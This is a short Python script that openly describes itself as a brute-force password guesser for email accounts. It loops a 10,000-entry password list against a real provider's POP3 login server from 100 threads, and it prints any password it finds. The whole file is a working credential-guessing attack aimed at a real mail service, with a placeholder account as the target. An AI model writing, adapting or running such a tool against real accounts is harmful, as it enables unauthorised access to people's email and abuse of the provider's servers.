'''
This script uses brute force password guessing using a provided passwordlist to attempt to log into a provided email address.
'''

import poplib
import os
from threading import Thread
from time import sleep

os.chdir(os.path.dirname(os.path.abspath(__file__)))

class bruteForcer():
    def __init__(self, email, server, passwordfile):
        self.email = email
        self.server = server
        self.listInt = 0
        self.passInt = 0
        self.passwordList = self.getSegment(passwordfile)
        self.passwordfile = passwordfile

    def getSegment(self, passwordfile, segmentsize=100):
        # read a 100 line segment of the password file
        with open(passwordfile, 'r') as file:
            for i in range(0, self.listInt - 1):
                file.readline()
            
            passwordList = []
            for i in range(0, segmentsize):
                passwordList.append(file.readline().strip())

            return passwordList

    def getNext(self):
        self.listInt += 1
        self.passInt += 1
        if self.passInt == 101:
            self.passwordList = self.getSegment(self.passwordfile)
            self.passInt = 0
        return self.passwordList[self.passInt - 1]

    def attempt(self):
        try:
            pop = poplib.POP3(self.server)
            pop.user(self.email)
            password = self.getNext()
            pop.pass_(password)
            print('Password found: ' + password)
            return True
        except poplib.error_proto as e:
            if 'Invalid login or password' in str(e):
                print('Password not found: ' + password)
                return False
            else:
                return e
    
    def threadManager(self):
        while True:
            self.attempt()
            sleep(5)




forcer = bruteForcer('example@rambler.ru', 'pop.rambler.ru', 'lists/10000.txt')
# use threading to speed up the process
threads = []
for i in range(0, 100):
    threads.append(Thread(target=forcer.threadManager))
    threads[i].start()


